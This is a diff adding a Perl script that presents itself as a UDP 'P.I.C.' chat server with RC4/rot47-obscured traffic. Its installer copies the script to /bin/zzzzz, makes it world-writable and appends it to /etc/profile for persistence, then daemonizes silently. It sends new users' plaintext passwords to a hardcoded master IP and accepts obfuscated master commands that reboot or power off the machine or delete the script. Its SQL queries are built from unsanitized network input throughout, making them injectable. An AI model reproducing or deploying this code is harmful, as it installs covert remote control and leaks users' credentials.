@@ -1,0 +1,491 @@
+#!/usr/bin/perl
+use DBI;
+use CGI;
+my $ServerName = "/bin/zzzzz";
+my $db = "users"; 
+my $dbhost = "localhost"; 
+my $dbuser = "root"; 
+my $dbpass = ""; 
+my $table = "stats";
+my $SEND_PORT = 666; 
+my $server_host = "127.0.0.1"; 
+my $proto = 'udp'; 
+my $RC4pass = "1"; 
+my $MASTER_IP = "127.0.0.1";
+my $LogFile = "/etc/p.i.c_log.txt";
+my $AutoRunFile = "/etc/profile";
+
+sub decry ($){ local($^W) = 0;my $str = shift;my $res = "";
+$str =~ tr|A-Za-z0-9+=/||cd;$str =~ s/=+$//;  $str =~ tr|A-Za-z0-9+/| -_|;  
+while ($str =~ /(.{1,60})/gs) {my $len = chr(32 + length($1)*3/4); 
+$res .= unpack("u", $len . $1 ); }$res;}
+
+use IO::Socket;
+
+$MAX_CHUNK_SIZE = 1024 unless $MAX_CHUNK_SIZE;
+sub new {my ( $class, $key )  = @_; my $self = bless {}, $class; $self->{state} = Setup( $key );
+$self->{x} = 0;$self->{y} = 0;$self;}
+sub RC4 {my $self;my( @state, $x, $y );if ( ref $_[0] ) {$self = shift;@state = @{ $self->{state} };
+$x = $self->{x};$y = $self->{y};} else {@state = Setup( shift );$x = $y = 0;}
+my $message = shift;my $num_pieces = do {my $num = length($message) / $MAX_CHUNK_SIZE;
+my $int = int $num;$int == $num ? $int : $int+1;};for my $piece ( 0..$num_pieces - 1 ) {
+my @message = unpack "C*", substr($message, $piece * $MAX_CHUNK_SIZE, $MAX_CHUNK_SIZE);
+for ( @message ) {$x = 0 if ++$x > 255;$y -= 256 if ($y += $state[$x]) > 255;
+@state[$x, $y] = @state[$y, $x];$_ ^= $state[( $state[$x] + $state[$y] ) % 256];}
+substr($message, $piece * $MAX_CHUNK_SIZE, $MAX_CHUNK_SIZE) = pack "C*", @message;}
+if ($self) {$self->{state} = \@state;$self->{x} = $x;$self->{y} = $y;}$message;}
+sub Setup {my @k = unpack( 'C*', shift );my @state = 0..255;my $y = 0;for my $x (0..255) {
+$y = ( $k[$x % @k] + $state[$x] + $y ) % 256;@state[$x, $y] = @state[$y, $x];}wantarray ? @state : \@state;}
+
+sub rot47 {my ($str)=@_;$str =~ tr/!-~/P-~!-O/;return $str;} 
+
+my $remoteaddress; $|=1; 
+my $MAXLEN = 1024; 
+my $hostname = `(hostname) 2>/dev/null`;	
+my $tag_send	= getlogin."\@".$hostname;
+my $tag_receive 	= 'mrX';	
+my $msg; my $J = ":";
+$SIG{CHLD} = 'IGNORE';
+
+sub daemonize{
+    chdir '/'                 or die "Application Error! Are you root?\n";
+    open STDIN, '/dev/null'   or die "Application Error! Are you root?\n";
+    open STDOUT, '>>/dev/null' or die "Application Error! Are you root?\n";
+    open STDERR, '>>/dev/null' or die "Application Error! Are you root?\n";
+    defined(my $pid = fork)   or die "Application Error! Are you root?\n";
+    exit if $pid;
+    setsid                    or die "Application Error! Are you root?\n";
+    umask 0;
+}
+
+sub SendStatus {
+my($message) = @_;
+my $master_sock = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $MASTER_IP) ;
+		my $encoded0 = rot47("l0g$J$message");
+		my $encRC4 = RC4( $RC4pass, $encoded0 );
+		$master_sock->send("$encRC4");
+}
+
+sub SendUserStatus {
+my($message, $remo_ip) = @_;
+my $user_sock = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $remo_ip) ;
+		my $encoded0 = rot47("$message");
+		my $encRC4 = RC4( $RC4pass, $encoded0 );
+		$user_sock->send("$encRC4") or &SendStatus("SendUserStatus returned error! $!");
+}
+
+sub SetDB {
+my $nodb = undef;
+my $dbh_create = DBI->connect("dbi:mysql:$nodb:$dbhost",$dbuser,$dbpass) ;
+my $sql_create = "create database $db";
+my $sth_create = $dbh_create->prepare($sql_create);
+$sth_create->execute or &SendStatus("MYSQL error while creating Database! ($DBI::errstr)");
+
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sql = "create table `$table` (".
+				  "`id` int(10) not null auto_increment,".
+				  "`name` varchar(150) not null default '',".
+				  "`pass` varchar(150) not null default '',". 
+				  "`email` varchar(150) not null default '',". 
+				  "`logged` varchar(15) not null default '',". 
+				  "`online` varchar(15) not null default '',". 
+				  "`ip` varchar(50) not null default '',". 
+				  "`banned` varchar(30) not null default '',". 
+				  " primary key(`id`),". 
+				  " unique key `id`(`id`)".
+				  ") type=MyISAM comment='' AUTO_INCREMENT=1 ;";
+my $sth = $dbh->prepare($sql);
+$sth->execute or &SendStatus("MYSQL error while creating Database! ($DBI::errstr)");
+}
+
+sub checklog{
+open (F,"<$LogFile");
+my $xxx = <F>;
+if (length($xxx) > 2){
+	close F;
+	daemonize();
+
+} elsif ($xxx == "1"){
+	unlink("$LogFile");
+    	my($logFile) = "$LogFile";
+    	my($script)  = __FILE__;
+    	my($name)    = $ServerName;
+	open(LOGFILE,">>$logFile");
+    	print LOGFILE ("$name");
+    	close(LOGFILE);
+	close F;
+	&SetDB();
+	daemonize();
+
+} else {
+	print "<---------------------------------->\n";
+	print "|      Installing P.I.C. Server       |\n";
+	print "<---------------------------------->\n";
+	system "cp $0 $ServerName";
+    	my($logFile) = "$LogFile";
+    	my($script)  = __FILE__;
+    	my($name)    = "1";
+        open(LOGFILE,">>$logFile");
+        print LOGFILE ("$name");
+        close(LOGFILE);
+	system "echo '\n$ServerName' >> $AutoRunFile";
+	system "chmod 777 $ServerName";
+	system "$ServerName";
+	print "running server!\n";
+	exit;
+	}}
+
+
+sub FetchUsers {
+my ($ip_addr) = @_; my $online;
+my $container; my $num; my $i;
+$container .= "users$J";
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sq = "select count(*) from $table";
+my $st = $dbh->prepare($sq);
+$st->execute or &SendStatus("MYSQL error while fetching users list! ($DBI::errstr)");
+while (@row = $st->fetchrow_array){ 
+$container .= $row[$i++];
+}
+
+my $sql = "select * from $table";
+my $sth = $dbh->prepare($sql);
+$sth->execute or &SendStatus("MYSQL error while fetching users list! ($DBI::errstr)");
+$container .= "$J";
+while (@row = $sth->fetchrow_array) {
+if($row[5] eq "true"){$online = "oN4nDrUnn1N";} elsif($row[5] eq "false"){$online = "0fF_L1nE"}
+$container .= $row[1].$online;
+$container .= "$J";
+}
+print $container."\n";
+my $sock3 = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $ip_addr) ;
+		my $encoded0 = rot47($container);
+		my $encRC4 = RC4( $RC4pass, $encoded0 );
+		$sock3->send("$encRC4") or &SendStatus ( "send $!");
+}
+
+sub AddUser {
+my ($name, $pass, $email, $ip) = @_;
+print "registering ".$name." ".$pass." ".$email."\n";
+&SendStatus("Registering new user: $name $pass $email");
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sql_ex = "select * from $table where name = '$name'"; 
+my $sth_ex = $dbh->prepare($sql_ex);
+$sth_ex->execute or &SendStatus("MYSQL error ($DBI::errstr) while registering new user ($name, $email, $ip)!");
+if($sth_ex->rows == 1){
+		print "account allready used!".$sth_ex->rows."\n";
+		&SendUserStatus("reg_notok", $ip);
+	} else {
+print "registering new user!\n";
+my $sql = "insert into $table (name, pass, email, logged, online, ip, banned) values ('$name', md5('$pass'), '$email', 'true', 'true', '$ip', 'false')";
+my $sth = $dbh->prepare($sql);
+$sth->execute or &SendStatus("($DBI::errstr) while registering new user!($name, $email, $ip)");
+print "sent reg_ok";
+&SendUserStatus("reg_ok", $ip);
+&FetchUsers($ip);
+&SendStatus("New user just have registered ($name, $email, $ip) !");
+}}
+
+
+sub NotifyAllUsers {
+my ($message) = @_;
+	my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+	print "starting to send to everyone\n";
+	my $global_data; my $data_int; my $container_next; my $int;
+	my $sql_fetch_ip = "select ip from $table"; 
+	my $sth_fetch_ip = $dbh->prepare($sql_fetch_ip); 
+	$sth_fetch_ip->execute or  SendStatus("Problem while getting IPs list! ($DBI::errstr)");
+		while(@rowz = $sth_fetch_ip->fetchrow_array){
+		print @rowz; print "\n";
+		$global_data .= $rowz[$data_int];
+		$global_data .= "$J";
+		}
+		@glob = split(/$J/, $global_data);
+		print @glob; print "\n";
+		my $sql_count_ip = "select count(*) from $table";
+		my $st_count_ip = $dbh->prepare($sql_count_ip);
+		$st_count_ip->execute;
+		while (@row_next = $st_count_ip->fetchrow_array){ 
+		$container_next .= $row_next[$int++];
+		}
+			print "container_next: ".$container_next."\n";
+			foreach(1..$container_next){
+			my $UseIP = $glob[$data_int++];
+			my $sock3 = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $UseIP) ;
+			my $encoded0 = rot47("<p.i.c_server> $message");
+			my $encRC4 = RC4( $RC4pass, $encoded0 );
+			$sock3->send("$encRC4") or &SendStatus ( "send $!");
+			print "send to: ".$UseIP."\n";
+			}
+}
+
+&checklog();
+
+while (1){
+my $q=CGI->new(); $remoteaddress = $q->remote_addr();
+my @words; int $i;
+$ERTEPort = 1111; 
+my $msg; my $MAXLEN = 1024;
+my $sock = IO::Socket::INET->new(LocalPort => $ERTEPort, Proto => $proto);
+$sock->recv($msg, $MAXLEN) ;
+my $decRC4 = RC4( $RC4pass, $msg );
+my $decoded = rot47($decRC4);
+@words = split(/$J/, $decoded);
+my $login = $words[1]; my $pass = $words[2]; my $email = $words[3];
+if($words[0] eq "auth") {
+
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sql = "select * from $table where name = '$login' or pass = md5('$pass')"; 
+my $sth = $dbh->prepare($sql);
+$sth->execute or &SendStatus ( "cannot execute mysql query while checking is user($login) exists!\n");
+&SendStatus ( "status of name where name: ".$sth->rows);
+
+if($sth->rows == 1){
+
+&SendStatus ( "user ($login) is here! checking pass...");
+my $sqlex = "select * from $table where name = '$login' and pass = md5('$pass')";
+my $sthex = $dbh->prepare($sqlex);
+$sthex->execute or &SendStatus ( "Cannot execute mysql query while checking user $login!");
+		if($sthex->rows == 1){ 
+		my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ; my $data;
+		my $sql = "select banned from $table where name = '$login'"; 
+		my $sth = $dbh->prepare($sql);
+		$sth->execute or &SendStatus ( "cannot execute mysql query while checking is user($login) banned!\n");
+		@row = $sth->fetchrow_array;
+		my $rowcheck = @row[$data];
+		if($rowcheck eq "false") {
+			&SendStatus ( "user ($login) logged successfuly!");
+			my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+			my $squla = "update $table set logged = 'true', online = 'true' where name = '$login'";
+			my $sth = $dbh->prepare($squla);
+			$sth->execute or &SendStatus ( "Cannot set values of logged ($login) !");
+			&SendUserStatus("auth_ok", $remoteaddress);
+			&FetchUsers($remoteaddress);
+			} else {
+			&SendUserStatus("banned_user", $remoteaddress);
+			}
+		} else { 
+		print "\nwrong login or pass!\n";
+		&SendUserStatus("auth_notok", $remoteaddress);
+		}
+} else { 
+print "\nno such user!\n";
+&SendUserStatus("auth_nouser", $remoteaddress);
+}
+} elsif ($words[0] eq "reg"){
+
+&AddUser($login, $pass, $email, $remoteaddress);
+} elsif ($words[0] eq "log_of"){
+
+my $User = $words[1];
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sql = "update $table set logged = 'false', online = 'false' where name = '$User'";
+my $status =  $dbh->prepare($sql);
+$status->execute or &SendStatus ( "Could not log user($remoteaddress) off");
+}elsif ($words[0] eq "main_stats"){
+if($remoteaddress eq $MASTER_IP) {
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) or &SendStatus ("While fetching global stats - $DBI::errstr");
+my $sql = "select name from $table";  my $sql2 = "select name from $table where online = 'true'";
+my $sql3 = "select name from $table where online = 'false'"; my $sql4 = "select name from $table where banned = 'true'";
+
+my $sth1 = $dbh->prepare($sql); $sth1->execute or &SendStatus ("$DBI::errstr"); my $tmachines1 = $sth1->rows;
+my $sth2 = $dbh->prepare($sql2); $sth2->execute or &SendStatus ("$DBI::errstr"); my $tmachines2 = $sth2->rows;
+my $sth3 = $dbh->prepare($sql3); $sth3->execute or &SendStatus ("$DBI::errstr"); my $tmachines3 = $sth3->rows;
+my $sth4 = $dbh->prepare($sql4); $sth4->execute or &SendStatus ("$DBI::errstr"); my $tmachines4 = $sth4->rows;
+
+my $sock3 = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $MASTER_IP) ;
+my $encoded0 = rot47("main_stats$J$tmachines1$J$tmachines2$J$tmachines3$J$tmachines4");
+my $encRC4 = RC4( $RC4pass, $encoded0 );
+$sock3->send("$encRC4") or  &SendStatus ( "send $!");
+print "$tmachines1:$tmachines2:$tmachines3:$tmachines4";
+
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "the_stats"){
+if($remoteaddress eq $MASTER_IP) {
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) or &SendStatus ("Detailed stats error - $DBI::errstr");
+my $sql = "select * from $table";
+my $sth = $dbh->prepare($sql);
+$sth->execute or print "SQL Error: $DBI::errstr\n";
+while (@row = $sth->fetchrow_array) {
+my $status; my $logged; my $banned;
+if($row[5] eq "false"){$status = "OffLine"} elsif($row[5] eq "true"){$status = "OnLine"}
+if($row[4] eq "false"){$logged = "Logged OFF"} elsif($row[4] eq "true"){$logged = "Logged IN"}
+if($row[7] eq "false"){$banned = "Not Banned"} elsif($row[7] eq "true"){$banned = "Banned!"}
+	my $sock3 = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $MASTER_IP) ;
+	my $encoded0 = rot47("the_stats$J".$row[1]."$J".$status."$J".$row[6]."$J".$logged."$J".$banned);
+	my $encRC4 = RC4( $RC4pass, $encoded0 );
+	$sock3->send("$encRC4") or &SendStatus ( "send $!");
+
+	}
+	} else {
+	&SendStatus ("Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "b4n_thE_Imp0stEr"){
+if($remoteaddress eq $MASTER_IP) {
+	my $User2Ban = $words[1]; my $Reason = $words[2];
+	my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) or &SendStatus ("Ban error - $DBI::errstr");
+	my $sql = "update $table set banned = 'true', logged = 'false', online = 'false' where name = '$User2Ban'";
+	my $sth = $dbh->prepare($sql);
+	$sth->execute or &SendStatus ("Ban error - $DBI::errstr");
+	&NotifyAllUsers("User $User2Ban has been banned. Reason: $Reason");
+	} else { 
+	&SendStatus ("Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "re_sT4rT"){
+if($remoteaddress eq $MASTER_IP) {
+	my $Reason = $words[1];
+	&NotifyAllUsers("Server machine is going to reboot. Reason: $Reason");
+	system ("reboot"); die("Rebooting Machine!\n");
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+} elsif ($words[0] eq "p0w3_R0fF"){
+if($remoteaddress eq $MASTER_IP) {
+	my $Reason = $words[1];
+	&NotifyAllUsers("Server machine is going offline. Reason: $Reason");
+	system("poweroff"); die("Machine OFFLINE!\n");
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "sUs_p3nd_eXecut1on"){
+if($remoteaddress eq $MASTER_IP) {
+	my $time2rest = 60 * $words[1]; my $Reason = $words[2];
+	&NotifyAllUsers("Server work suspended for $time2rest minutes. Reason: $Reason");
+	sleep $time2rest;
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "dE_4Th"){
+if($remoteaddress eq $MASTER_IP) {
+	my $Reason = $words[1];
+	&NotifyAllUsers("Chat closed. Reason: $Reason");
+	unlink $0; die("That is all. Goodbye ;(\n");
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "p1c0fF"){
+if($remoteaddress eq $MASTER_IP) {
+	my $Reason = $words[1];
+	&NotifyAllUsers("Chat closed for some time. Reason: $Reason");
+	die("Going to rest finaly...:)");
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+
+}elsif ($words[0] eq "dead" && $words[1] eq "out"){
+if($remoteaddress eq $MASTER_IP) {
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sql = "delete from $table where banned = 'true'";
+my $sth = $dbh->prepare($sql);
+$sth->execute or &SendStatus ( "Could not delete banned users!");
+	} else {
+	&SendStatus ( "Unprivileged user ($remoteaddress)  tried to execute admin command! ".$words[0]);
+	}
+} elsif ($words[0] eq "uSe_RliST"){
+print "uSe_RliST func";
+if($remoteaddress eq $MASTER_IP) {
+	&FetchUsers($MASTER_IP);
+	} else {
+	my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+	my $UserName = $words[1]; my $DestAddr; my $test;
+	my $sql_check = "select logged from $table where ip = '$remoteaddress'";
+	my $sth_check = $dbh->prepare($sql_check);
+	$sth_check->execute or &SendStatus ( "cant check if user ($remoteaddress) is logged");
+	@row = $sth_check->fetchrow_array;
+	my $rowcheck = @row[$test];
+	if($rowcheck eq "true") {
+		&FetchUsers($remoteaddress);
+		}else {
+		&SendUserStatus("not_logged", $remoteaddress);
+		}
+	}
+}
+elsif ($words[0] eq "to_user"){
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $UserName = $words[1]; my $DestAddr; my $test; print "$UserName\n"; 
+if(length($UserName) < 2){
+&SendUserStatus("UserName too small!", $remoteaddress);
+goto Endof;
+}
+my $sql_check = "select logged from $table where ip = '$remoteaddress'";
+my $sth_check = $dbh->prepare($sql_check);
+$sth_check->execute or &SendStatus ( "cant check if user ($remoteaddress) is logged");
+@row = $sth_check->fetchrow_array;
+my $rowcheck = @row[$test];
+if($rowcheck eq "true") {
+	my $tag_send = $words[2]; my $OrigMsg = $words[3];
+	my $sql_fetch_ip = "select ip from $table where name = '$UserName'";
+	my $sth_fetch_ip = $dbh->prepare($sql_fetch_ip);
+	$sth_fetch_ip->execute; my $data;
+	@row = $sth_fetch_ip->fetchrow_array;
+	$DestAddr = @row[$data];
+	my $sock3 = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $DestAddr) ;
+	my $encoded0 = rot47("from_user$J$tag_send$J$OrigMsg");
+	my $encRC4 = RC4( $RC4pass, $encoded0 );
+	$sock3->send("$encRC4") or &SendStatus ( "send $!");
+	print "Message sent to: $DestAddr\n";
+	} else {
+	&SendUserStatus("not_logged", $remoteaddress);
+	}
+
+}else { 
+my $test;
+my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+my $sql_check = "select logged from $table where ip = '$remoteaddress'";
+my $sth_check = $dbh->prepare($sql_check);
+$sth_check->execute or SendStatus("Cannot check if user is logged!");
+@row = $sth_check->fetchrow_array;
+my $rowcheck = @row[$test];
+
+if($rowcheck eq "true") {
+	my $dbh = DBI->connect("dbi:mysql:$db:$dbhost",$dbuser,$dbpass) ;
+	print "starting to send to everyone\n";
+	my $global_data; my $data_int; my $container_next; my $int;
+	my $sql_fetch_ip = "select ip from $table"; 
+	my $sth_fetch_ip = $dbh->prepare($sql_fetch_ip); 
+	$sth_fetch_ip->execute or  SendStatus("Problem while getting IPs list!");
+		while(@rowz = $sth_fetch_ip->fetchrow_array){
+		print @rowz; print "\n";
+		$global_data .= $rowz[$data_int];
+		$global_data .= "$J";
+		}
+		@glob = split(/$J/, $global_data);
+		print @glob; print "\n";
+		my $sql_count_ip = "select count(*) from $table";
+		my $st_count_ip = $dbh->prepare($sql_count_ip);
+		$st_count_ip->execute;
+		while (@row_next = $st_count_ip->fetchrow_array){ 
+		$container_next .= $row_next[$int++];
+		}
+			print "container_next: ".$container_next."\n";
+			foreach(1..$container_next){
+			my $UseIP = $glob[$data_int++];
+			if($UseIP == $remoteaddress) {goto nosend;}
+			my $sock3 = IO::Socket::INET->new(Proto => $proto, PeerPort  => $SEND_PORT, PeerAddr  => $UseIP) ;
+			my $encoded0 = rot47("$decoded");
+			my $encRC4 = RC4( $RC4pass, $encoded0 );
+			$sock3->send("$encRC4") or &SendStatus ( "send $!");
+			print "send to: ".$UseIP."\n";
+			nosend:
+			print "Sender's IP omitted\n";
+			}
+	} else {
+	&SendUserStatus("not_logged", $remoteaddress);
+	print "not logged..\n";
+	}
+}
+Endof:
+print "\n".$decoded."\n" ;
+sleep 1;
+}
+
+
